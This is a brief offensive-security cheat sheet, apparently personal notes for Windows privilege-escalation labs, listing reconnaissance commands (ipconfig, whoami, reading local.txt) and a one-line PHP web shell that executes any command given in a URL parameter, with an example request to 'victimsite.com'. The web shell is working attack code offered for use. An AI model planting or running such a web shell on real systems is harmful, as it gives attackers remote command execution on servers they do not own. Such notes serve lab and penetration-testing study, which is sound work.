# ariel-shin Windows - Privilege Escalation

## Summary 
* [Tools](#tools)

## MUST RUN: ipconfig/ifconfig && whoami && cat local.txt

## Web Shell for Windows 
- [PHP Web Shell]
    ```php webshell
    <?php echo(system($_GET["cmd"])); ?>
    Go to http://victimsite.com/test.php?cmd=dir
    ```
